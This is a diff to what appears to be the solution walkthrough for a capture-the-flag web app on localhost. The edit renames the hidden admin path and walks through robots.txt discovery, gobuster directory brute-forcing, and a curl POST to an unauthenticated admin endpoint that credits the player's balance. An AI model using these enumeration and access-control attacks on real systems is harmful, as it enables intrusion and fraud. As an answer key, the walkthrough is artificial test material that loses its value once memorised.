@@ -7,14 +7,16 @@
 
 1. Register an account. You start with $100.
 2. Find hidden paths, using either:
-   - `curl http://127.0.0.1:5000/robots.txt`, which shows `Disallow: /admin-panel`
+   - `curl http://127.0.0.1:5000/robots.txt`, which shows `Disallow: /admin`
    - or brute-force directories: `gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/common.txt`
-3. Open `/admin-panel`. It works even when you're logged out.
+     (dirb's own default wordlist, `/usr/share/wordlists/dirb/common.txt`, finds it too -
+     it has `admin`, just not `admin-panel`)
+3. Open `/admin`. It works even when you're logged out.
 4. Use "Manual balance adjustment" to credit your user with at least $1,900.
    With curl (the first registered user after a reset gets id 6; accounts 1-5 are seeded -
    see the "Seed accounts" section of the README):
    ```bash
-   curl -X POST http://127.0.0.1:5000/admin-panel/adjust -d user_id=6 -d amount=1900
+   curl -X POST http://127.0.0.1:5000/admin/adjust -d user_id=6 -d amount=1900
    ```
 5. Reload your dashboard to see the flag.
 
